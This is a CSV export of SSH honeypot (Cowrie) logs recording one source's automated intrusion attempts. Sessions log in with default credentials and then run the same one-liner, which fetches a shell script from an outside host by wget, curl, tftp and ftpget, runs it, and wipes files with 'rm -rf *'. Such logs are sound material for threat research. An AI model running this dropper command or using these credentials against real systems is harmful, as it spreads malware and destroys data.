eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.client.version,2021-02-12 11:03:03.019684+00:00,46.101.170.78,,8de64e11eff4,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.020494+00:00,46.101.170.78,,c1d1903651aa,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.021266+00:00,46.101.170.78,,17e4251c67c1,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.022036+00:00,46.101.170.78,,512d3db61679,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.022805+00:00,46.101.170.78,,f5340c2af215,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.session.closed,2021-02-12 11:03:03.128588+00:00,46.101.170.78,,2c66ac8680e8,153.42050886154175,Connection lost after 153 seconds
cowrie.session.closed,2021-02-12 11:03:03.133944+00:00,46.101.170.78,,f3d415cd95ad,153.46934580802917,Connection lost after 153 seconds
cowrie.client.kex,2021-02-12 11:03:03.204935+00:00,46.101.170.78,,5502e0f67ab6,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.208052+00:00,46.101.170.78,,ee5a71984425,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.211153+00:00,46.101.170.78,,699ec31c16b1,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.214345+00:00,46.101.170.78,,673e50040790,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.216987+00:00,46.101.170.78,,d05de82095ee,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.218999+00:00,46.101.170.78,,7c4516690ed9,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.221039+00:00,46.101.170.78,,f5340c2af215,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.223044+00:00,46.101.170.78,,cce20dc708e8,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.225113+00:00,46.101.170.78,,245d647c50d7,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.227155+00:00,46.101.170.78,,50a1710da928,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.229167+00:00,46.101.170.78,,17e4251c67c1,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.231167+00:00,46.101.170.78,,512d3db61679,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.233199+00:00,46.101.170.78,,32b9b9296860,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.235194+00:00,46.101.170.78,,724be802578d,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.237213+00:00,46.101.170.78,,8de64e11eff4,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:03:03.239645+00:00,46.101.170.78,,c1d1903651aa,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.session.closed,2021-02-12 11:03:03.242697+00:00,46.101.170.78,,b6163e070819,153.58066987991333,Connection lost after 153 seconds
cowrie.session.closed,2021-02-12 11:03:03.243644+00:00,46.101.170.78,,2818b81df37e,153.5847418308258,Connection lost after 153 seconds
cowrie.session.closed,2021-02-12 11:03:03.244602+00:00,46.101.170.78,,808acb3a3408,153.57647252082825,Connection lost after 153 seconds
cowrie.login.success,2021-02-12 11:03:03.978399+00:00,46.101.170.78,,ee5a71984425,,login attempt [user/user] succeeded
cowrie.login.success,2021-02-12 11:03:04.185402+00:00,46.101.170.78,,f5340c2af215,,login attempt [root/password] succeeded
cowrie.login.success,2021-02-12 11:03:04.205233+00:00,46.101.170.78,,673e50040790,,login attempt [butter/xuelp123] succeeded
cowrie.login.success,2021-02-12 11:03:04.208140+00:00,46.101.170.78,,5502e0f67ab6,,login attempt [root/!QAZ2wsx] succeeded
cowrie.login.success,2021-02-12 11:03:04.210788+00:00,46.101.170.78,,7c4516690ed9,,login attempt [dev/dev] succeeded
cowrie.login.success,2021-02-12 11:03:04.213676+00:00,46.101.170.78,,17e4251c67c1,,login attempt [mc/mc] succeeded
cowrie.login.success,2021-02-12 11:03:04.216399+00:00,46.101.170.78,,cce20dc708e8,,login attempt [test/test] succeeded
cowrie.login.success,2021-02-12 11:03:04.218411+00:00,46.101.170.78,,699ec31c16b1,,login attempt [root/1qaz@WSX] succeeded
cowrie.login.success,2021-02-12 11:03:04.220116+00:00,46.101.170.78,,50a1710da928,,login attempt [ubuntu/ubuntu] succeeded
cowrie.login.success,2021-02-12 11:03:04.221942+00:00,46.101.170.78,,245d647c50d7,,login attempt [git/git] succeeded
cowrie.login.success,2021-02-12 11:03:04.223761+00:00,46.101.170.78,,512d3db61679,,login attempt [admin/admin] succeeded
cowrie.login.success,2021-02-12 11:03:04.225598+00:00,46.101.170.78,,d05de82095ee,,login attempt [root/1qaz2wsx] succeeded
cowrie.login.success,2021-02-12 11:03:04.299071+00:00,46.101.170.78,,8de64e11eff4,,login attempt [zabbix/zabbix] succeeded
cowrie.login.success,2021-02-12 11:03:04.302866+00:00,46.101.170.78,,724be802578d,,login attempt [system/system] succeeded
cowrie.login.success,2021-02-12 11:03:04.304941+00:00,46.101.170.78,,c1d1903651aa,,login attempt [server/server] succeeded
cowrie.login.success,2021-02-12 11:03:04.314477+00:00,46.101.170.78,,32b9b9296860,,login attempt [postgres/postgres] succeeded
cowrie.session.params,2021-02-12 11:03:04.395087+00:00,46.101.170.78,,ee5a71984425,,[]
cowrie.command.input,2021-02-12 11:03:04.396006+00:00,46.101.170.78,,ee5a71984425,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:04.899518+00:00,46.101.170.78,,f5340c2af215,,[]
cowrie.command.input,2021-02-12 11:03:04.900385+00:00,46.101.170.78,,f5340c2af215,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.009884+00:00,46.101.170.78,,673e50040790,,[]
cowrie.command.input,2021-02-12 11:03:05.010748+00:00,46.101.170.78,,673e50040790,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.050378+00:00,46.101.170.78,,5502e0f67ab6,,[]
cowrie.command.input,2021-02-12 11:03:05.051228+00:00,46.101.170.78,,5502e0f67ab6,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.199834+00:00,46.101.170.78,,cce20dc708e8,,[]
cowrie.command.input,2021-02-12 11:03:05.200750+00:00,46.101.170.78,,cce20dc708e8,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.240194+00:00,46.101.170.78,,17e4251c67c1,,[]
cowrie.command.input,2021-02-12 11:03:05.241046+00:00,46.101.170.78,,17e4251c67c1,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.463388+00:00,46.101.170.78,,7c4516690ed9,,[]
cowrie.command.input,2021-02-12 11:03:05.464268+00:00,46.101.170.78,,7c4516690ed9,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.504262+00:00,46.101.170.78,,699ec31c16b1,,[]
cowrie.command.input,2021-02-12 11:03:05.505136+00:00,46.101.170.78,,699ec31c16b1,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.739944+00:00,46.101.170.78,,245d647c50d7,,[]
cowrie.command.input,2021-02-12 11:03:05.740828+00:00,46.101.170.78,,245d647c50d7,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:05.782055+00:00,46.101.170.78,,50a1710da928,,[]
cowrie.command.input,2021-02-12 11:03:05.782927+00:00,46.101.170.78,,50a1710da928,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:06.049518+00:00,46.101.170.78,,512d3db61679,,[]
cowrie.command.input,2021-02-12 11:03:06.050379+00:00,46.101.170.78,,512d3db61679,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:06.093834+00:00,46.101.170.78,,d05de82095ee,,[]
cowrie.command.input,2021-02-12 11:03:06.094710+00:00,46.101.170.78,,d05de82095ee,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:06.160218+00:00,46.101.170.78,,8de64e11eff4,,[]
cowrie.command.input,2021-02-12 11:03:06.161094+00:00,46.101.170.78,,8de64e11eff4,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:06.499697+00:00,46.101.170.78,,724be802578d,,[]
cowrie.command.input,2021-02-12 11:03:06.500685+00:00,46.101.170.78,,724be802578d,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:06.644847+00:00,46.101.170.78,,32b9b9296860,,[]
cowrie.command.input,2021-02-12 11:03:06.708527+00:00,46.101.170.78,,32b9b9296860,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:03:06.810672+00:00,46.101.170.78,,c1d1903651aa,,[]
cowrie.command.input,2021-02-12 11:03:06.811531+00:00,46.101.170.78,,c1d1903651aa,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 11:03:06.841998+00:00,46.101.170.78,,ee5a71984425,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.030432+00:00,46.101.170.78,,f5340c2af215,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.209217+00:00,46.101.170.78,,8de64e11eff4,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.214945+00:00,46.101.170.78,,32b9b9296860,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.216744+00:00,46.101.170.78,,699ec31c16b1,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.229000+00:00,46.101.170.78,,17e4251c67c1,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.230620+00:00,46.101.170.78,,50a1710da928,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.232346+00:00,46.101.170.78,,245d647c50d7,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:07.233802+00:00,46.101.170.78,,ee5a71984425,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download.failed,2021-02-12 11:03:57.470225+00:00,46.101.170.78,,ee5a71984425,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download,2021-02-12 11:03:57.494129+00:00,46.101.170.78,,c1d1903651aa,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:57.496048+00:00,46.101.170.78,,512d3db61679,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:57.497675+00:00,46.101.170.78,,7c4516690ed9,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:57.499238+00:00,46.101.170.78,,724be802578d,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:03:57.501057+00:00,46.101.170.78,,d05de82095ee,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download.failed,2021-02-12 11:03:57.507073+00:00,46.101.170.78,,8de64e11eff4,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 11:04:47.745976+00:00,46.101.170.78,,8de64e11eff4,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 11:04:47.749727+00:00,46.101.170.78,,32b9b9296860,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 11:05:37.983976+00:00,46.101.170.78,,32b9b9296860,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 11:05:37.988062+00:00,46.101.170.78,,699ec31c16b1,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 11:06:28.216029+00:00,46.101.170.78,,699ec31c16b1,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 11:06:28.219857+00:00,46.101.170.78,,17e4251c67c1,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 11:07:18.448056+00:00,46.101.170.78,,17e4251c67c1,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 11:07:18.452010+00:00,46.101.170.78,,50a1710da928,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 11:08:08.685347+00:00,46.101.170.78,,50a1710da928,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
